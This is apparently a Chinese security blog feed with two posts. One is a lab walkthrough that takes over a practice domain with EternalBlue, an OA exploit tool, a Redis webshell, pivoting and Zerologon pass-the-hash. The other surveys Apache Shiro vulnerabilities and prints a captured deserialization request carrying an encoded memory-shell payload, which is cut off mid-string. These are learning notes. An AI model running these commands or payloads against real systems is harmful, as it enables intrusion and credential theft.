    <content type="html"><![CDATA[<p>已知：外网靶机ip:192.168.56.147</p><h1 id="打点"><a href="#打点" class="headerlink" title="打点"></a>打点</h1><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202410112046342.png" alt="image.png"><br>看到4个端口，我们有两种打法，打445可能存在的ms17-010，或者从80端口入手</p><h2 id="方案一："><a href="#方案一：" class="headerlink" title="方案一："></a>方案一：</h2><p>135,449，标准的ms17-010端口，我们再用nmap跑一次<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202410112059773.png" alt="image.png"><br>不出意外应该是有的，msf直接上</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">msfconsole<br><span class="hljs-keyword">search</span> ms17<span class="hljs-number">-010</span><br>use exploit/windows/smb/ms17_010_eternalblue<br><span class="hljs-keyword">show</span> <span class="hljs-keyword">options</span><br><span class="hljs-keyword">set</span> rhosts <span class="hljs-number">192.168</span><span class="hljs-number">.56</span><span class="hljs-number">.147</span><br>run<br></code></pre></td></tr></table></figure><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202410112103791.png" alt="image.png"><br>轻松~~</p><h2 id="方案二："><a href="#方案二：" class="headerlink" title="方案二："></a>方案二：</h2><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202410112057887.png" alt="image.png"><br>同时我们访问80端口，看到一个通达OA，经验不够，工具来凑，直接扫目录（当然最好先爆破一波弱口令）<br>dirsearch看了一轮啥也没有，我们百度下通达<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202410112111067.png" alt="image.png"></p><p>还是百度高效<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202410112112117.png" alt="image.png"><br>11.3，这种老洞肯定一堆exp了，我们这里直接选择一键利用工具<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202410112113174.png" alt="image.png"><br>真好，版本都不用看了<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202410112114653.png" alt="image.png"><br>那这也就算拿下了<br>通过哥斯拉我们可以快速的对主机进行信息收集<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202410112141114.png" alt="image.png"></p><h1 id="内网"><a href="#内网" class="headerlink" title="内网"></a>内网</h1><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202410112117455.png" alt="image.png"><br>看到一个内网的ip地址，思来想去，反正都是system权限了，cs上线再说<br>对主机明文进行抓取<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202410141606704.png" alt="image.png"><br>得到密码admin，我们尝试通过3389连接，但是一直连不上去，于是文件上传fscan，准备尝试对内网进行信息收集，因为windows主机在开了防火墙之后一般是禁ping的，所以我们的指令是<br><code>fscan.exe -h 10.0.20.1/24 -np</code><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202410141617920.png" alt="image.png"><br>这里虽然不知道为什么哥斯拉跑出来是null，但还是有result.txt<br>我们可以看到10.0.20.99是开放的，主要是80端口跟6379端口<br>为了进一步的渗透，我们要进行隧道搭建，这里选择用msfconsole<br><code>run post/multi/manage/autoroute</code><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202410141633394.png" alt="image.png"><br><code>bg</code><br><code>use auxiliary/server/socks_proxy</code><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202410141634240.png" alt="image.png"><br>我们把proxychains4中的配置改成socks5加1080端口即可<br><code>vim /etc/proxychains4.conf</code><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202410141636588.png" alt="image.png"><br>我这自动就改了<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202410141638313.png" alt="image.png"><br>ok，成功访问（记得msf里要run了先）<br>因为我们刚才已经知道了80跟6379有东西，我觉得打内网的80比较麻烦，这里先看看6379的redis有没有东西<br>这里用redis-cli进行连接，发现不用密码，直接连接成功<br><code>proxychains4 redis-cli -h 10.0.20.99</code><br>我们找找通过redis getshell的方法<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202410141845146.png" alt="image.png"><br>这个写shell还不错<br>先猜猜目录，windows的系统，还有点老，应该就是phpstudy搭建的，一般旧的phpstudy目录就是&#x2F;phpStudy&#x2F;PHPTutorial&#x2F;WWW&#x2F;，然后就是猜（不想猜，就在C盘根目录下）<br>或者我们可以用CONFIG GET dir看看redis的目录，根据这个来猜<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202410141857662.png" alt="image.png"><br>在kali中开哥斯拉，连<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202410141859797.png" alt="image.png"><br>简单看下信息<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202410141904210.png" alt="image.png"><br>又是一个10段的ip，嘶，套上套<br>从msf挂个正向代理去打试试<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202410141922126.png" alt="image.png"><br>生成个exe，传到2016上，并把防火墙关了<br><code>netsh advfirewall set allprofiles state off</code><br>然后用proxychains4开msfconsole，因为内容有点长，很多无关紧要的信息，这里直接打代码出来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/multi/handler <br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/bind_tcp<br><span class="hljs-built_in">set</span> rhost 10.0.20.99<br>run<br></code></pre></td></tr></table></figure><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202410141931315.png" alt="image.png"><br>连上了，接下来又是隧道建立，路由<br>run post&#x2F;multi&#x2F;manage&#x2F;autoroute<br>arp -a<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202410141933479.png"><br>看到一台10.0.10.110</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile"><span class="hljs-keyword">run</span><span class="language-bash"> post/windows/gather/enum_domain</span><br></code></pre></td></tr></table></figure><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202410141941170.png" alt="image.png"><br>ok，主域内容，我们继续添加路由<br>run post&#x2F;multi&#x2F;manage&#x2F;autoroute<br>run autoroute -p<br>bg<br>use auxiliary&#x2F;server&#x2F;socks_proxy<br>set srvport 1081<br>然后这个也需要改一下&#x2F;etc&#x2F;proxychains4.conf<br>不知道为什么我这一直不行，无语，转战cs<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202410142021482.png" alt="image.png"><br>先创建监听器<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202410142207366.png" alt="image.png"><br>连接，这里记得beacon也要生成个新的，我这里脑抽了，一直用旧的，一直连不上去<br>cs中监听8887端口<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202410142211761.png" alt="image.png"><br>然后在proxychains4.conf中把原本的1080注释掉，改成<br>socks4 127.0.0.1 8887<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202410142216697.png" alt="image.png"><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202410142223285.png" alt="image.png"></p><p>发现有445，而且我们知道主机名字，想到CVE-2020-1472<br><code>git clone https://github.com/dirkjanm/CVE-2020-1472.git</code><br>这个指令将密码掏空<br><code>proxychains4 python3 cve-2020-1472-exploit.py WIN2019 10.0.10.110 </code><br>然后安装impacket<br><code>git clone https://github.com/CoreSecurity/impacket.git</code><br>然后进到impacket目录<br>看到有setup.py的<br>python3 setup.py install<br>然后进到同目录下的examples目录<br><code>proxychains4 python3 secretsdump.py vulntarget/win2019\$@10.0.10.110 -no-pass</code><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202410142252979.png" alt="image.png"><br>可以看到我们已经把域里的hash都拿下了<br>我们对Administrator进行解密<br><code>proxychains4 python3 smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:c7c654da31ce51cbeecfef99e637be15 administrator@10.0.10.110 </code><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202410142256126.png" alt="image.png"><br>成功拿下！</p>]]></content>
    
    
    <categories>
      
      <category>打靶</category>
      
    </categories>
    
    
    <tags>
      
      <tag>打靶</tag>
      
      <tag>内网</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SHIRO</title>
    <link href="/2024/11/11/Shiro/"/>
    <url>/2024/11/11/Shiro/</url>
    
    <content type="html"><![CDATA[<h2 id="历史漏洞"><a href="#历史漏洞" class="headerlink" title="历史漏洞"></a>历史漏洞</h2><table><thead><tr><th>漏洞编号</th><th>shiro版本</th><th>配置</th></tr></thead><tbody><tr><td>CVE-2010-3863</td><td>shiro &lt; 1.1.0<br>JSecurity 0.9.x</td><td>&#x2F;** &#x3D; anon</td></tr><tr><td>CVE-2014–0074<br>shiro-460</td><td>shiro 1.x &lt; 1.2.3</td><td></td></tr><tr><td>CVE-2016-4437<br>shiro-550</td><td>shiro 1.x &lt; 1.2.5</td><td></td></tr><tr><td>CVE-2016-6802</td><td>shiro &lt; 1.3.2</td><td>Context Path绕过</td></tr><tr><td>CVE-2019-12422<br>shiro-721</td><td>shiro &lt; 1.4.2</td><td></td></tr><tr><td>CVE-2020-1957<br>shiro-682</td><td>shiro &lt; 1.5.2</td><td>&#x2F;** &#x3D; anon</td></tr><tr><td>CVE-2020-11989<br>shiro-782</td><td>shiro &lt; 1.5.3</td><td><code>=1.5.2 /toJsonList/* = authc;</code><br><code>&lt;1.5.3 /alter/* = authc &amp;&amp; =an</code></td></tr><tr><td>CVE-2020-13933</td><td>shiro &lt; 1.6.0</td><td><code>/hello/* = authc</code></td></tr><tr><td>CVE-2020-17510</td><td>shiro &lt; 1.7.0</td><td><code>/hello/* = authc</code></td></tr><tr><td>CVE-2020-17523</td><td>shiro &lt; 1.7.1</td><td><code>/hello/* = authc</code></td></tr><tr><td>CVE-2021-41303</td><td>shiro &lt; 1.8.0</td><td><code>/hello/* = authc</code></td></tr><tr><td>CVE-2022-32532</td><td>shiro &lt; 1.9.1</td><td><code>RegExPatternMatcher&lt;br&gt;&amp;&amp; /alter/.*</code></td></tr></tbody></table><p>认证绕过漏洞：CVE-2010-3863，CVE-2020-1957</p><p>反序列化：shiro550，shiro721</p><h3 id="CVE-2010-3863"><a href="#CVE-2010-3863" class="headerlink" title="CVE-2010-3863"></a>CVE-2010-3863</h3><p>Apache shiro 1.1.0以前，shiro进行权限验证前未对url做标准化处理，通过构造特殊url绕过权限验证</p><p>这个漏洞利用方式就是在访问一些鉴权网页，如&#x2F;admin，我们无法访问时<br>可以构造&#x2F;.&#x2F;admin，&#x2F;&#x2F;admin，&#x2F;..&#x2F;admin尝试绕过</p><p>原理：<br>shiro对URL的匹配（shiro.ini）<br>anon:匿名拦截器，不需要登录就能访问，一般用于静态资源，或者移动端接口<br>authc:登录拦截器，需要登录认证才能访问的资源</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">[urls]<br>/login.jsp = authc<br>/logout = = <span class="hljs-built_in">logout</span><br>/account/** = authc<br>/admin/ = authc,perms[<span class="hljs-string">&quot;audit:list&quot;</span>]<br>/** = anon<br></code></pre></td></tr></table></figure><p>shiro对url匹配比较严格</p><p><code>/** = anon</code>这里使用一个通配，不完全符合时就可以直接绕过</p><h3 id="CVE-2020-1957"><a href="#CVE-2020-1957" class="headerlink" title="CVE-2020-1957"></a>CVE-2020-1957</h3><p>Apache Shiro 1.5.2以前，利用Shiro与Spring对URL处理的差异化进行越权</p><p>payload:<code>..;</code></p><p>访问&#x2F;admin无效</p><p>访问&#x2F;xxx&#x2F;..;&#x2F;admin成功</p><p>原理：</p><p>Spring中&#x2F;resource&#x2F;xx与&#x2F;resource&#x2F;xx&#x2F;是同一个资源</p><p>但是shiro中这两个就是不同的路径</p><h3 id="shiro550"><a href="#shiro550" class="headerlink" title="shiro550"></a>shiro550</h3><p>shiro 1.2.5以前，利用硬编码密钥构造rememberme参数，可以进行反序列化攻击</p><h4 id="rememberMe参数加密过程"><a href="#rememberMe参数加密过程" class="headerlink" title="rememberMe参数加密过程"></a>rememberMe参数加密过程</h4><ol><li>将用户名序列化</li><li>AES-CBC-PKCS5Padding加密，将key硬编码为kPH+blxk5D2deZilxcaaaA&#x3D;&#x3D;</li><li>经过base64编码后设置到cookie中的rememberme字段</li></ol><h4 id="解密过程"><a href="#解密过程" class="headerlink" title="解密过程"></a>解密过程</h4><ol><li>获取rememberMe字段的值</li><li>Base64解密+AES解密</li><li>反序列化获取用户名</li></ol><h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>URLDNS</p><h3 id="shiro721"><a href="#shiro721" class="headerlink" title="shiro721"></a>shiro721</h3><p>跟shiro550不同在修改原本的硬编码，将AES密钥修改成了动态生成，而且采用的是AES-128-CBC加密</p><p>但是在密码学层面，存在CBC翻转攻击，可以绕过密钥直接构造攻击密文，但前提是我们要有一个合法用户的cookie</p><h2 id="Key爆破"><a href="#Key爆破" class="headerlink" title="Key爆破"></a>Key爆破</h2><h4 id="爆破方式"><a href="#爆破方式" class="headerlink" title="爆破方式"></a>爆破方式</h4><p>Dnslog与URLDNS链结合</p><p>返回包rememberMe字段是否存在</p><p>密钥不正确或类型转换异常时：返回包包含set-cookie:rememberMe&#x3D;deleteMe</p><p>密钥正确且没有类型转换异常，则不存在</p><p>1.2.4 base64+AES+默认</p><p>1.4.2 base64+AES-CBC+动态 CBC翻转</p><p><code>&gt;1.4.2 base64+AES-GCM+动态</code></p><h2 id="利用链爆破"><a href="#利用链爆破" class="headerlink" title="利用链爆破"></a>利用链爆破</h2><p>shiro_rce_tool</p><p>有key无链时可以尝试利用JRMPClient</p><h1 id="实际案例"><a href="#实际案例" class="headerlink" title="实际案例"></a>实际案例</h1><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411071102451.png" alt="image.png"><br>shiro反序列化<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411071103897.png" alt="image.png"></p><p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411071104465.png" alt="image.png"><br>这里顺便对流量进行下学习，发现首次连接，是需要对密码进行一个传参<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411071106634.png" alt="image.png"><br>执行一个whoami<br>发现后续都是对pass1024进行一个请求<br>这个时候我就很好奇，这是怎么做到的，因为我查找文件，并没有找到favicondemo.ico这一个文件，在源码里找也找不到favicondemo.ico相关的东西<br>于是我就抓取了shiro反序列化工具的流量<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/202411071110154.png" alt="image.png"></p><pre><code class="hljs">POST / HTTP/1.1Host: 192.168.216.145p: pass1024Content-Type: application/x-www-form-urlencodedAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9path: /favicondemo1.icoUser-Agent: Mozilla/5.0 (Windows NT 6.0; rv:2.0) Gecko/20100101 Firefox/4.0 Opera 12.14Cookie: rememberMe=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Content-Length: 14383  user=yv66vgAAADQCAQoAiAEXCQB4ARgJAHgBGQgBGgkAeAEbCAEcCQB4AR0IAR4JAHgBHwcBIAoACgEXCgAKASEKAAoBIgoAeAEjCQB4ASQIASUJAHgBJgoAiAEnCgCIASgIASkKASoBKwcBLAoAMQEtCgAWAS4KASoBLwoBKgEwBwExCAEyCgEzATQKADEBNQoBMwE2BwE3CgEzATgKACABOQoAIAE6CgAxATsIATwKAC4BPQgBPgcBPwoALgFABwDNCgFBAUIKADABQwgBRAcBRQcAoQcBRgcBRwgBSAoALgFJCAFKCAFLCAFMCAFNCAFOCgB4AU8IAVALAE8BUQgAkQcBUgoAPQEXCAFTCAFUCAFVCwBQAVYLAE8BVwsAUAFXCgB4AVgKAD0BWQgBWgoAGwEiCwBQAVsKAD0BIgoBXAFdCgFcAV4KAVwBXwoALgFgBwFhBwFiCAFjCAFkCgAuAWUIAWYIAIoKAC4BZwoBaAFpCgFoAWoIAIwLAE8BawsBbAFtCAFuBwFvBwFwBwFxCAFyCQFzAXQKAWgBdQsBbAF2CQF3AXgKAXkBegsA6gF7CAF8CgFBAWkJAXMBfQgBfggBfwgA3ggBgAoAMQGBCAGCCgAbAYMIAYQLAE8BhQsBhgGHCgB4AYgKAHgBiQgBigsBiwGMBwGNCgAuAY4KAHgBJwoAeAGPCwGLAZAIAZELAE8BkAcBkgoAfwEXCgAwAZMKADEBlAoBXAGVCgAwASIKAH8BlgoAeAGXCgAxAZgHAZkHAZoBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQACeGMBABJMamF2YS9sYW5nL1N0cmluZzsBAANQd2QBAARwYXRoAQADbWQ1AQACY3MBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAIExjb20vc3VtbWVyc2VjL3gvR29kemlsbGFGaWx0ZXI7AQAaKExqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7KVYBAAF6AQAXTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAAFRAQAVKFtCKUxqYXZhL2xhbmcvQ2xhc3M7AQACY2IBAAJbQgEAAXgBAAcoW0JaKVtCAQABYwEAFUxqYXZheC9jcnlwdG8vQ2lwaGVyOwEABHZhcjQBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAFzAQABbQEAAVoBAA1TdGFja01hcFRhYmxlBwGNBwGbBwExAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAB1MamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0OwEAA3JldAcBRwEADGJhc2U2NEVuY29kZQEAFihbQilMamF2YS9sYW5nL1N0cmluZzsBAAdFbmNvZGVyAQASTGphdmEvbGFuZy9PYmplY3Q7AQAGYmFzZTY0AQARTGphdmEvbGFuZy9DbGFzczsBAAR2YXI2AQACYnMBAAV2YWx1ZQEACkV4Y2VwdGlvbnMBAAxiYXNlNjREZWNvZGUBABYoTGphdmEvbGFuZy9TdHJpbmc7KVtCAQAHZGVjb2RlcgEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgEABHZhcjcBAANvYmoBAAZvdXRwdXQBABhMamF2YS9sYW5nL1N0cmluZ0J1ZmZlcjsBAAV0YWdfcwEABXRhZ19lBwFGBwFSAQAIcGFyc2VPYmoBABUoTGphdmEvbGFuZy9PYmplY3Q7KVYBAARkYXRhAQATW0xqYXZhL2xhbmcvT2JqZWN0OwEABWNsYXp6AQADcmVxAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEACHJlcXVlc3QyAQAEcmVzcAEABHZhcjgBAAlhZGRGaWx0ZXIBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACWZpbHRlck1hcAEABXZhcjIxAQAMZmlsdGVyTWFwT2JqAQAEbmFtZQEAAWkBAAFJAQARZmlsdGVyU3RhcnRNZXRob2QBABpMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEADmZpbmRGaWx0ZXJNYXBzAQAKZmlsdGVyTWFwcwEABXZhcjI1AQAFdmFyMTEBAAV2YXIyMgEADGNvbnRleHRGaWVsZAEAEmFwcGxpY2F0aW9uQ29udGV4dAEALUxvcmcvYXBhY2hlL2NhdGFsaW5hL2NvcmUvQXBwbGljYXRpb25Db250ZXh0OwEAD3N0YW5kYXJkQ29udGV4dAEAKkxvcmcvYXBhY2hlL2NhdGFsaW5hL2NvcmUvU3RhbmRhcmRDb250ZXh0OwEACnN0YXRlRmllbGQBABJmaWx0ZXJSZWdpc3RyYXRpb24HAZ0BAAdEeW5hbWljAQAMSW5uZXJDbGFzc2VzAQAqTGphdmF4L3NlcnZsZXQvRmlsdGVyUmVnaXN0cmF0aW9uJER5bmFtaWM7AQAOc2VydmxldENvbnRleHQBAB5MamF2YXgvc2VydmxldC9TZXJ2bGV0Q29udGV4dDsBAAZmaWx0ZXIBABZMamF2YXgvc2VydmxldC9GaWx0ZXI7AQAKZmlsdGVyTmFtZQEAA3VybAcBngcBmgcBnwcBbwcBcAcBnQcBoAcBRQcBoQEABGluaXQBAB8oTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOylWAQAMZmlsdGVyQ29uZmlnAQAcTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOwcBogEACGRvRmlsdGVyAQBbKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZ